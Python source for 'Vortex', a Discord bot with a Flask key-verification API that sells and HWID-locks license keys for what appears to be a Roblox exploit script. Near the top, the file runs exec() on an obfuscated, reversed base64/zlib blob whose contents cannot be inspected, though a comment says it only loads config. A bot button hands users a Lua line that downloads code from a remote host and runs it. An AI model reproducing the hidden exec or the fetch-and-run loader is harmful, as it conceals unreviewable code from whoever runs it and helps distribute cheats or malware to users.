import disnake
from disnake.ext import commands
from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3, uuid, threading, os, datetime, requests

# --- 1. OBFUSCATED CONFIGURATION ---
# This executes the encoded string to load your Token, IDs, and Webhook into memory
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=ghXcMyPz3wEvx3P/qY03arjwp9vmprqrqQdxT2xcR1iHFj76msiwDf/ln66+WymBtFaz0zN/tgJsIyDCnIEGXlQIKKVFCjMw35Luma2WCzsbiUT1bOW2u+y5WMCucfT3Td/r3ugs3ZuJbfmL6jpEgH97jwIVClWeMbwvCqFflGFXD2bAETkgoIEkKZyiMlKKeT/WifCj0QrYkl4YUkCCGBTFFRVVEBIFAm6iFUZYH/n2cU7ykXGs2VNIeur2fYG8+8Y9SS42MoNlUapQf5lf4ud272XHDF5Ox4vHJmb4aId0hxjJI/JzJAsc1MuP++k/rnH3MtyRSWBWxI2CZ/i2gBQYJDk4pJWZX4ZxGzT7GOgAAkgulsz1wJe'))

# --- 2. DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect("vortex.db")
    conn.execute('''CREATE TABLE IF NOT EXISTS keys 
                 (key TEXT PRIMARY KEY, rid INTEGER, hwid TEXT, duration INTEGER, start_time TEXT, blk BOOLEAN DEFAULT 0)''')
    conn.commit()
    conn.close()

# --- 3. WEBHOOK LOGGER ---
def send_log(status, details, color):
    try:
        embed = {
            "title": f"🛰️ Vortex System Log: {status}",
            "description": details,
            "color": color,
            "footer": {"text": f"Vortex Auth • {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
        }
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    except Exception as e:
        print(f"Webhook Error: {e}")

# --- 4. WEB API (ROBLOX BACKEND) ---
app = Flask(__name__)
CORS(app)

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    rid, hwid, key_input = data.get("rid"), data.get("hwid"), data.get("key")
    
    conn = sqlite3.connect("vortex.db")
    res = conn.execute("SELECT duration, start_time, hwid, rid, blk FROM keys WHERE key = ?", (key_input,)).fetchone()
    
    if not res:
        conn.close()
        return jsonify({"success": False, "msg": "INVALID_KEY"}), 404
        
    duration, start_time, saved_hwid, saved_rid, blk = res

    if blk:
        conn.close()
        return jsonify({"success": False, "msg": "BLACKLISTED"}), 403

    now = datetime.datetime.now()

    if start_time is None:
        conn.execute("UPDATE keys SET rid = ?, hwid = ?, start_time = ? WHERE key = ?", (rid, hwid, now.isoformat(), key_input))
        conn.commit()
        conn.close()
        send_log("KEY ACTIVATED", f"**Key:** `{key_input}`\n**User:** `{rid}`\n**Duration:** `{duration if duration != -1 else 'Lifetime'}`", 0x00ff00)
        return jsonify({"success": True, "msg": "ACTIVATED"}), 200

    if duration != -1:
        start_dt = datetime.datetime.fromisoformat(start_time)
        expiry_dt = start_dt + datetime.timedelta(days=duration)
        if now > expiry_dt:
            conn.close()
            return jsonify({"success": False, "msg": "KEY_EXPIRED"}), 403

    if saved_hwid != hwid:
        conn.close()
        send_log("HWID MISMATCH", f"**Key:** `{key_input}`\n**Attempted HWID:** `{hwid}`", 0xffa500)
        return jsonify({"success": False, "msg": "HWID_MISMATCH"}), 403

    conn.close()
    return jsonify({"success": True}), 200

# --- 5. TICKET & PANEL UI ---
class TicketView(disnake.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @disnake.ui.button(label="Close Ticket", style=disnake.ButtonStyle.danger, emoji="🔒")
    async def close(self, button, inter):
        await inter.response.send_message("Closing ticket in 3 seconds...")
        await inter.channel.delete()

class VortexPanelView(disnake.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @disnake.ui.button(label="GET SCRIPT", style=disnake.ButtonStyle.secondary, emoji="📜")
    async def script_btn(self, button, inter):
        lua = "shared.VortexKey = \"PUT_KEY_HERE\"\nloadstring(game:HttpGet('https://vortex-d9nu.onrender.com/load'))()"
        await inter.send(f"### 🌀 Vortex Loader\n```lua\n{lua}\n```", ephemeral=True)

    @disnake.ui.button(label="BUY / GET KEY", style=disnake.ButtonStyle.success, emoji="🎫")
    async def buy_btn(self, button, inter):
        overwrites = {
            inter.guild.default_role: disnake.PermissionOverwrite(read_messages=False),
            inter.author: disnake.PermissionOverwrite(read_messages=True, send_messages=True),
            inter.guild.get_role(STAFF_ROLE_ID): disnake.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        channel = await inter.guild.create_text_channel(name=f"ticket-{inter.author.name}", overwrites=overwrites)
        
        embed = disnake.Embed(
            title="🎫 Vortex Support",
            description=f"Welcome {inter.author.mention}! Staff will assist you soon.\n\n**Staff:** Use `.gen [days]` to create a key.",
            color=0x2ecc71
        )
        await channel.send(embed=embed, view=TicketView())
        await inter.send(f"✅ Ticket created: {channel.mention}", ephemeral=True)

# --- 6. BOT COMMANDS ---
bot = commands.Bot(command_prefix=".", intents=disnake.Intents.all())

@bot.command()
async def gen(ctx, days: int):
    is_staff = any(role.id == STAFF_ROLE_ID for role in ctx.author.roles)
    if not is_staff and ctx.author.id != OWNER_ID:
        return await ctx.send("❌ No Permission.")

    new_key = f"VORTEX-{uuid.uuid4().hex[:8].upper()}"
    conn = sqlite3.connect("vortex.db")
    conn.execute("INSERT INTO keys (key, duration) VALUES (?, ?)", (new_key, days))
    conn.commit()
    conn.close()

    dur_label = "Lifetime" if days == -1 else f"{days} Days"
    await ctx.send(f"🔑 **Key Created:** `{new_key}`\n⏳ **Duration:** `{dur_label}`\n*Timer starts on first use.*")

@bot.command()
async def panel(ctx):
    if ctx.author.id != OWNER_ID: return
    await ctx.send(embed=disnake.Embed(title="🌀 VORTEX AUTH", color=0x2b2d31), view=VortexPanelView())

if __name__ == "__main__":
    init_db()
    port = int(os.environ.get("PORT", 5000))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port), daemon=True).start()
    bot.run(TOKEN)
